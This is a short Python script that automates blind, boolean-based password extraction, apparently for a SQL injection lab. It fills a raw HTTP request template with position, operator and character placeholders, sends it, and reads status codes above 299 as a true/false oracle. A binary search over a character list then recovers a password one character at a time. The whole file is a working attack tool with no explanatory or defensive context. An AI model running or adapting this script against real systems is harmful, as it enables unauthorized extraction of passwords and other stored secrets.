import requests

with open("characters.txt", "r") as char_file:
    line = char_file.readline().strip()

with open("request.txt", "r") as req_file:
    raw_request = req_file.read()

result = ""
characters = list(line)

length = int(input("Enter the password length: "))


def parse_request(raw_request, position, operation, character):
    req = raw_request.replace("$pos$", position)
    req = req.replace("$op$", operation)
    req = req.replace("$char$", character)

    lines = req.splitlines()
    method, path, _ = lines[0].split()

    headers = {}
    body = None

    for line in lines[1:]:
        if line.strip() == "":
            break
        key, value = line.split(":", 1)
        headers[key.strip()] = value.strip()

    host = headers.get("Host")
    url = f"https://{host}{path}"

    response = requests.request(method=method, url=url, headers=headers, data=body)

    return response.status_code


for i in range(length):
    left = 0
    right = len(characters) - 1
    found_char = None

    while left <= right:
        mid = (left + right) // 2
        mid_val = characters[mid]

        response_code = parse_request(raw_request, str(i + 1), "=", mid_val)

        if response_code > 299:
            found_char = mid_val
            print(f"Position: {i+1}, Character: {mid_val}")
            break

        response_code = parse_request(raw_request, str(i + 1), ">", mid_val)

        if response_code > 299:
            left = mid + 1
        else:
            right = mid - 1

    if found_char:
        result += found_char
    else:
        print(f"Character not found at position {i+1}")
        break

print(f"Result: {result}")
